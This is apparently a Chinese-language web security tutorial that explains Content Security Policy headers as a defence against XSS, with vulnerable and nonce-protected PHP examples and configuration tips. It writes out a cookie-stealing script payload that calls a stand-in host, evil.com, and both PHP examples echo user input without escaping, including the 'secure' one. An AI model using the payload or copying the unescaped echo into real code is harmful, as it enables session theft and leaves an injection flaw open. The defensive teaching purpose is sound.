🛡️ 什麼是內容安全策略 (CSP)？

📃 網站白名單

CSP 是一種強大的 HTTP 安全性標頭。它可以告訴瀏覽器哪些來源的資源（JavaScript、CSS、圖片等）是受信任的，將其餘的全部封殺。

🦠 對抗 XSS 攻擊

傳統防禦 XSS 依賴過濾與跳脫字元。若有漏網之魚，駭客就能注入惡意腳本。CSP 是最後一道防線，就算被注入了，瀏覽器也會拒絕執行不合法的腳本！

🚨 缺乏 CSP 的後果

若未設置 CSP Header，瀏覽器將預設執行所有載入的腳本。駭客可輕易寫入 <script>fetch('evil.com?cookie='+document.cookie)</script> 盜取您的憑證。

⚖️ 程式碼大對決：CSP 安全設定

csp_vulnerable.php (無防護 ❌) 

// 🚨 危險：沒有設定任何 Content-Security-Policy 標頭
header("Content-Type: text/html; charset=utf-8");

// 如果直接輸出用戶輸入，將導致 XSS 漏洞
echo "搜尋結果: " . $_GET['q']; 

// 惡意腳本 <script>alert(1)</script> 會被毫無阻攔地執行
csp_secure.php (CSP + Nonce ✅) 

// 步驟 A：生成隨機的 Nonce (Number Used Once)
$nonce = bin2hex(random_bytes(16));

// 步驟 B：設定嚴格的 CSP 標頭！
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-$nonce';");

echo "搜尋結果: " . $_GET['q']; 

// 唯有帶上正確 Nonce 的腳本才能執行，XSS 腳本將被阻擋！
<script nonce="<?php echo $nonce; ?>">
    console.log("合法腳本執行中");
</script>

🛡️ 開發建議：CSP 最佳實踐

🚫

最小權限原則

初始配置應使用 default-src 'none';，再依據需求逐一開放必要的資源來源（如 img-src 'self'）。

⚠️

禁用不安全關鍵字

嚴禁在正式環境使用 'unsafe-inline' 與 'unsafe-eval'，這會讓 CSP 對 XSS 的防禦力形同虛設。

📊

使用 Report-Only 模式

上線前可先使用 Content-Security-Policy-Report-Only 標頭，收集違反策略的報告，避免誤擋正常功能。

🖼️

防範 Clickjacking

在 CSP 中加入 frame-ancestors 'none'; 或 'self';，比傳統的 X-Frame-Options 更彈性且強大。
